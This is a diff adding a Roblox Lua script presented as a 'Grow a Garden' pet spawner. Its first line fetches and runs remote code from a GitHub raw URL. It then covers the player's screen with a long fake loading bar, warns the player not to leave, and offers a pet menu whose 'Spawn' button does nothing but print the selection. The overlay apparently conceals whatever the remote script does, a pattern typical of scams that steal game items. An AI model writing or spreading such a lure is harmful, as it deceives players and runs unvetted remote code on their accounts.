@@ -1,0 +1,130 @@
+-- Step 1: Execute external script first
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/converterrr/SwaguanscripterLoader/refs/heads/main/GAGHUb"))()
+end)
+
+if not success then
+    warn("Error loading external script:", err)
+end
+
+-- Step 2: After external script, run the loading UI
+local Players = game:GetService("Players")
+
+local function SetupLoadingScreen()
+    local player = Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    if playerGui:FindFirstChild("FullCoverLoading") then
+        playerGui.FullCoverLoading:Destroy()
+    end
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "FullCoverLoading"
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    screenGui.Parent = playerGui
+
+    local background = Instance.new("Frame")
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.BackgroundColor3 = Color3.new(0, 0, 0)
+    background.BackgroundTransparency = 1
+    background.ZIndex = 10000
+    background.Parent = screenGui
+
+    for i = 0, 1, 0.05 do
+        background.BackgroundTransparency = 1 - i
+        task.wait(0.03)
+    end
+
+    local progressBar = Instance.new("Frame")
+    progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    progressBar.Size = UDim2.new(0, 0, 0.01, 0)
+    progressBar.Position = UDim2.new(0.2, 0, 0.6, 0)
+    progressBar.BorderSizePixel = 0
+    progressBar.ZIndex = 10001
+    progressBar.Parent = background
+
+    local function createLabel(text, pos, size, font, color)
+        local label = Instance.new("TextLabel")
+        label.Size = size
+        label.Position = pos
+        label.Text = text
+        label.Font = font
+        label.TextColor3 = color
+        label.TextScaled = true
+        label.BackgroundTransparency = 1
+        label.ZIndex = 10001
+        label.Parent = background
+        return label
+    end
+
+    local loadingText = createLabel("Loading.. 0%", UDim2.new(0.4, 0, 0.45, 0), UDim2.new(0.2, 0, 0.05, 0), Enum.Font.GothamBold, Color3.new(1, 1, 1))
+    local statusText = createLabel("Please wait...", UDim2.new(0.33, 0, 0.53, 0), UDim2.new(0.34, 0, 0.03, 0), Enum.Font.Gotham, Color3.fromRGB(180, 180, 180))
+    local warningText = createLabel("Do not leave! Progress will be lost.", UDim2.new(0.33, 0, 0.58, 0), UDim2.new(0.34, 0, 0.03, 0), Enum.Font.GothamBold, Color3.fromRGB(255, 0, 0))
+    local creditText = createLabel("Grow a Garden Loader UI", UDim2.new(0.4, 0, 0.63, 0), UDim2.new(0.2, 0, 0.03, 0), Enum.Font.Gotham, Color3.fromRGB(200, 200, 200))
+    local espText = createLabel("Pet Spawner", UDim2.new(0.3, 0, 0.68, 0), UDim2.new(0.4, 0, 0.03, 0), Enum.Font.GothamBold, Color3.fromRGB(255, 255, 0))
+
+    local selectedPet = "None Selected"
+
+    local petGui = Instance.new("Frame")
+    petGui.Size = UDim2.new(0, 200, 0, 400)
+    petGui.Position = UDim2.new(0.8, 0, 0.1, 0)
+    petGui.BackgroundTransparency = 1
+    petGui.ZIndex = 10001
+    petGui.Parent = background
+
+    local title = createLabel("Select Pet To Spawn", UDim2.new(0, 0, 0, 0), UDim2.new(0, 200, 0, 40), Enum.Font.GothamBold, Color3.fromRGB(0, 180, 255))
+    title.Parent = petGui
+
+    local selectedLabel = createLabel("None Selected", UDim2.new(0, 0, 0, 40), UDim2.new(0, 200, 0, 30), Enum.Font.GothamBold, Color3.new(1, 1, 1))
+    selectedLabel.Parent = petGui
+
+    local petList = {"Disco Bee", "Queen Bee", "Raccoon", "Dragonfly", "Red Fox", "Butterfly", "Polar Bear", "Turtle"}
+    for i, pet in ipairs(petList) do
+        local button = Instance.new("TextButton")
+        button.Text = "SELECT " .. pet
+        button.Size = UDim2.new(0, 200, 0, 30)
+        button.Position = UDim2.new(0, 0, 0, 70 + (i - 1) * 35)
+        button.Font = Enum.Font.Gotham
+        button.TextColor3 = Color3.new(0, 0, 0)
+        button.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
+        button.ZIndex = 10001
+        button.Parent = petGui
+        button.MouseButton1Click:Connect(function()
+            selectedPet = pet
+            selectedLabel.Text = pet
+        end)
+    end
+
+    for i = 1, 100 do
+        progressBar.Size = UDim2.new(0.6 * (i / 100), 0, 0.01, 0)
+        loadingText.Text = "Loading.. " .. i .. "%"
+        task.wait(0.4)
+    end
+
+    loadingText.Text = "Finalizing..."
+    statusText.Text = "Initializing modules..."
+    task.wait(3)
+
+    loadingText.Text = "Complete. Click to Spawn."
+    statusText.Text = "Game ready!"
+
+    local spawnButton = Instance.new("TextButton")
+    spawnButton.Size = UDim2.new(0.15, 0, 0.07, 0)
+    spawnButton.Position = UDim2.new(0.42, 0, 0.75, 0)
+    spawnButton.Text = "Spawn"
+    spawnButton.Font = Enum.Font.GothamBold
+    spawnButton.TextColor3 = Color3.new(1, 1, 1)
+    spawnButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+    spawnButton.ZIndex = 10002
+    spawnButton.Parent = background
+
+    spawnButton.MouseButton1Click:Connect(function()
+        screenGui:Destroy()
+        print("Selected pet for spawning:", selectedPet)
+        -- You can place spawn logic here if needed
+    end)
+end
+
+SetupLoadingScreen()
